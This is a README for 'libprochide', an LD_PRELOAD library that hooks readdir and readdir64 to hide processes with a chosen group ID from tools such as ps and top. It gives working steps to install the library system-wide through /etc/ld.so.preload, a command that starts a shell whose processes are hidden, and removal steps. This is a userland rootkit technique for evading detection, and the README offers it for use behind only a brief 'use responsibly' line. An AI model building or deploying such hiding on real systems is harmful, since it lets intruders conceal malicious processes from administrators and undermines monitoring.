# libprochide

`libprochide` is an LD_PRELOAD module designed to hide processes based on their group ID (GID). When loaded, it intercepts calls to `readdir` and `readdir64` to filter out processes that belong to a specified GID, making them invisible to tools that list processes, such as `ps` and `top`.

## How It Works

The module works by overriding the `readdir` and `readdir64` functions using the LD_PRELOAD mechanism. When a directory entry is read, the module checks if the entry corresponds to a process ID (PID). If it does, it retrieves the GID of the process and compares it to the hidden GID (defined as `HIDDEN_GID` in the code). If the GID matches, the process is hidden from the listing.

## Installation

1. **Compile the shared library:**
    ```sh
    make
    ```

2. **Copy the compiled shared library to `/lib`:**
    ```sh
    sudo cp libprochide.so /lib
    ```

3. **Add the shared library to `/etc/ld.so.preload`:**
    ```sh
    echo "/lib/libprochide.so" | sudo tee -a /etc/ld.so.preload
    ```

4. **Verify that the module is loaded:**
    ```sh
    cat /etc/ld.so.preload
    ```

    You should see `/lib/libprochide.so` listed in the output.

## Testing

To test the module, you can change the GID of a process to the hidden GID and observe that it becomes hidden:

```sh
python3 -c 'import os; os.setgid(1001); os.system("/bin/bash")'
```

This command will start a new bash shell with the GID set to 1001. Any processes started from this shell will have the hidden GID.

## Uninstallation

1. **Remove the shared library from `/etc/ld.so.preload`:**
    ```sh
    sudo sed -i '/\/lib\/libprochide.so/d' /etc/ld.so.preload
    ```

2. **Delete the shared library from `/lib`:**
    ```sh
    sudo rm /lib/libprochide.so
    ```

## Notes

- Ensure that the `HIDDEN_GID` macro in `libprochide.c` is set to the GID you want to hide.
- Use this module responsibly and only on systems where you have permission to do so.
